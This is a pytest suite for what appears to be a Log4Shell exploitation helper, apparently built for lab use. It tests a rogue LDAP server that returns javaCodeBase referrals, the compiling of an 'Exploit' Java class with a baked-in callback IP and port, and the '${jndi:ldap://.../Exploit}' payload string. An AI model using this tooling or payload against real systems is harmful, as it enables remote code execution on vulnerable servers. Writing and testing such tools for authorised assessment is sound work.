import socket
import threading
from types import SimpleNamespace

import pytest
from fastapi import HTTPException

from app.modules import jndi_listener as jl


def _bind_request(message_id: int) -> bytes:
    # BindRequest ::= [APPLICATION 0] SEQUENCE { version INTEGER(3),
    #   name LDAPDN(""), authentication simple[0] OCTET STRING("") }
    body = jl._tlv(0x02, jl._int_body(3)) + jl._octet_string(b"") + jl._tlv(0x80, b"")
    op = jl._tlv(0x60, body)
    return jl._wrap_message(message_id, op)


def _search_request(message_id: int) -> bytes:
    # Contents don't matter -- handle_connection only reads the outer tag.
    op = jl._tlv(0x63, b"\x00")
    return jl._wrap_message(message_id, op)


def test_bind_response_round_trips_through_the_apps_own_parser():
    data = jl.bind_response(7)
    message_id, op = jl.parse_request(data)
    assert (message_id, op) == (7, 0x61)


def test_search_result_entry_carries_the_jndi_reference_attributes():
    data = jl.search_result_entry(3, "http://10.10.14.5:8000/")
    message_id, op = jl.parse_request(data)
    assert (message_id, op) == (3, 0x64)
    assert b"javaClassName" in data
    assert b"javaCodeBase" in data
    assert b"http://10.10.14.5:8000/" in data
    assert b"javaNamingReference" in data
    assert b"javaFactory" in data


def test_recv_message_reassembles_a_message_sent_in_several_chunks():
    sender, receiver = socket.socketpair()
    try:
        payload = jl.search_result_entry(1, "http://10.10.14.5:8000/")
        assert len(payload) > 127  # forces BER long-form length encoding

        def trickle():
            for i in range(0, len(payload), 5):
                sender.sendall(payload[i:i + 5])
        threading.Thread(target=trickle, daemon=True).start()

        received = jl.recv_message(receiver)
        assert received == payload
    finally:
        sender.close()
        receiver.close()


def test_handle_connection_answers_bind_then_search_then_done():
    client, server_conn = socket.socketpair()
    try:
        t = threading.Thread(target=jl.handle_connection,
                              args=(server_conn, "http://10.10.14.5:8000/"), daemon=True)
        t.start()

        client.sendall(_bind_request(1))
        message_id, op = jl.parse_request(jl.recv_message(client))
        assert (message_id, op) == (1, 0x61)

        client.sendall(_search_request(2))
        message_id, op = jl.parse_request(jl.recv_message(client))
        assert (message_id, op) == (2, 0x64)
        message_id, op = jl.parse_request(jl.recv_message(client))
        assert (message_id, op) == (2, 0x65)

        client.close()
        t.join(timeout=2)
    finally:
        client.close()


def test_a_real_independent_ldap_client_can_bind_and_read_the_referral():
    ldap3 = pytest.importorskip("ldap3")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("127.0.0.1", 0))
    port = sock.getsockname()[1]
    sock.listen(5)
    stop = threading.Event()
    t = threading.Thread(target=jl.serve_ldap,
                          args=(sock, "http://127.0.0.1:9999/", stop), daemon=True)
    t.start()
    try:
        server = ldap3.Server(f"ldap://127.0.0.1:{port}")
        conn = ldap3.Connection(server, auto_bind=True)
        assert conn.bound
        conn.search("", "(objectClass=*)",
                    attributes=["javaClassName", "javaCodeBase", "objectClass", "javaFactory"])
        assert len(conn.entries) == 1
        entry = conn.entries[0]
        assert str(entry.javaCodeBase) == "http://127.0.0.1:9999/"
        assert str(entry.javaClassName) == "Exploit"
        conn.unbind()
    finally:
        stop.set()
        sock.close()
        t.join(timeout=2)


@pytest.fixture(autouse=True)
def isolated_state(tmp_path, monkeypatch):
    monkeypatch.setattr(jl, "BUILD_DIR", tmp_path / "jndi-build")
    monkeypatch.setattr(jl, "_http_process", None)
    monkeypatch.setattr(jl, "_ldap_socket", None)
    monkeypatch.setattr(jl, "_ldap_stop", None)
    monkeypatch.setattr(jl, "_http_port", None)
    monkeypatch.setattr(jl, "_ldap_port", None)
    monkeypatch.setattr(jl, "_lhost", None)
    monkeypatch.setattr(jl, "_lport", None)


def test_compile_exploit_bakes_lhost_and_lport_into_the_java_source(tmp_path, monkeypatch):
    captured = {}

    def fake_run(argv, **kwargs):
        captured["argv"] = argv
        captured["source"] = (tmp_path / f"{jl.CLASS_NAME}.java").read_text()
        (tmp_path / f"{jl.CLASS_NAME}.class").write_bytes(b"fake-bytecode")
        return SimpleNamespace(returncode=0, stderr="")

    monkeypatch.setattr(jl.subprocess, "run", fake_run)
    result = jl.compile_exploit("10.10.14.5", 4444, tmp_path)
    assert result == tmp_path / "Exploit.class"
    assert '"10.10.14.5"' in captured["source"]
    assert "int port = 4444;" in captured["source"]
    assert captured["argv"][:2] == ["/usr/bin/javac", "-d"]


def test_compile_exploit_raises_on_a_javac_failure(tmp_path, monkeypatch):
    monkeypatch.setattr(jl.subprocess, "run",
                         lambda *a, **k: SimpleNamespace(returncode=1, stderr="syntax error"))
    with pytest.raises(HTTPException) as exc:
        jl.compile_exploit("10.10.14.5", 4444, tmp_path)
    assert exc.value.status_code == 500
    assert "syntax error" in exc.value.detail


def test_start_fails_when_javac_is_not_installed(monkeypatch):
    monkeypatch.setattr(jl, "javac_available", lambda: False)
    with pytest.raises(HTTPException) as exc:
        jl.start_jndi_listener(jl.JndiListenerStart(lhost="10.10.14.5", lport=4444))
    assert exc.value.status_code == 409


def test_start_rejects_a_non_ipv4_lhost(monkeypatch):
    monkeypatch.setattr(jl, "javac_available", lambda: True)
    with pytest.raises(HTTPException) as exc:
        jl.start_jndi_listener(jl.JndiListenerStart(lhost="attacker.example.com", lport=4444))
    assert exc.value.status_code == 422


def test_start_compiles_serves_and_reports_the_jndi_payload(monkeypatch, tmp_path):
    monkeypatch.setattr(jl, "javac_available", lambda: True)
    monkeypatch.setattr(jl, "vpn_status", lambda: {"tun0": "127.0.0.1/32"})
    monkeypatch.setattr(jl, "compile_exploit", lambda lhost, lport, build_dir: None)
    monkeypatch.setattr(jl, "_free_port", lambda host: 55123)

    fake_popen = SimpleNamespace(poll=lambda: None, pid=4242, terminate=lambda: None,
                                  wait=lambda timeout=None: None)
    monkeypatch.setattr(jl.subprocess, "Popen", lambda *a, **k: fake_popen)

    result = jl.start_jndi_listener(jl.JndiListenerStart(lhost="10.10.14.5", lport=4444))
    try:
        assert result["running"] is True
        assert result["http_port"] == 55123
        assert result["lhost"] == "10.10.14.5"
        assert result["lport"] == 4444
        assert result["jndi_payload"] == f"${{jndi:ldap://127.0.0.1:{result['ldap_port']}/Exploit}}"

        status = jl.jndi_listener_status()
        assert status == result
    finally:
        jl.stop_jndi_listener()


def test_stop_tears_down_both_the_http_process_and_the_ldap_socket(monkeypatch):
    monkeypatch.setattr(jl, "javac_available", lambda: True)
    monkeypatch.setattr(jl, "vpn_status", lambda: {"tun0": "127.0.0.1/32"})
    monkeypatch.setattr(jl, "compile_exploit", lambda lhost, lport, build_dir: None)
    monkeypatch.setattr(jl, "_free_port", lambda host: 55123)
    terminated = {}
    fake_popen = SimpleNamespace(poll=lambda: None, pid=4242,
                                  terminate=lambda: terminated.setdefault("called", True),
                                  wait=lambda timeout=None: None)
    monkeypatch.setattr(jl.subprocess, "Popen", lambda *a, **k: fake_popen)

    jl.start_jndi_listener(jl.JndiListenerStart(lhost="10.10.14.5", lport=4444))
    result = jl.stop_jndi_listener()
    assert result == {"running": False, "javac_available": True}
    assert terminated.get("called") is True
    assert jl._running() is False
